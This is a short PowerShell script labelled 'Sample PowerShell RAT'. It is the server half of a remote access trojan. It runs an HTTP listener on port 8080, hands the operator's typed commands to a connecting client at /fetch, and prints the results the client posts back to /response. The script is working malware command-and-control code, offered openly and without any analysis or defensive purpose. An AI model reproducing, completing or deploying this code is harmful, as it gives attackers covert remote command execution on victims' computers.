# Sample PowerShell RAT
# 
# .\server.ps1
# Listening ...
# <Waits for Client to Connect>
# Whats your order?: idle
# Whats your order?: cmd
# Whats your command?: Get-Process
# Start Server - Then execute client
# TODO - Make one script...





function Receive-Request {
   param(
      [Parameter(Mandatory,ValueFromPipelineByPropertyName)]
      $Request
   )
   $output = ""

   
      $size = $Request.ContentLength64 + 1
      
   $buffer = New-Object byte[] $size
   do {
      $count = $Request.InputStream.Read($buffer, 0, $size)
      $output += $Request.ContentEncoding.GetString($buffer, 0, $count)
   } until($count -lt $size)

   $Request.InputStream.Close()
   write-host $output
}

$listener = New-Object System.Net.HttpListener
$listener.Prefixes.Add('http://+:8080/') 

$listener.Start()
'Listening ...'
while ($true) {
    $context = $listener.GetContext() # blocks until request is received
    $request = $context.Request
    $response = $context.Response
    
    if ($request.Url -match '/fetch$' ) { # 
        $response.ContentType = 'text/plain'
        $message = Read-Host 'Whats your order?'
			if($message -eq 'cmd')
				{
					$message = Read-Host 'Whats your command?'
					
				}
    }
	
		
    if ($request.Url -match '/response$' -and ($request.HttpMethod -eq "POST") ) { 
		Receive-Request($request)
		
	}

    [byte[]] $buffer = [System.Text.Encoding]::UTF8.GetBytes($message)
    $response.ContentLength64 = $buffer.length
    $output = $response.OutputStream
    $output.Write($buffer, 0, $buffer.length)
    $output.Close()
}

$listener.Stop()
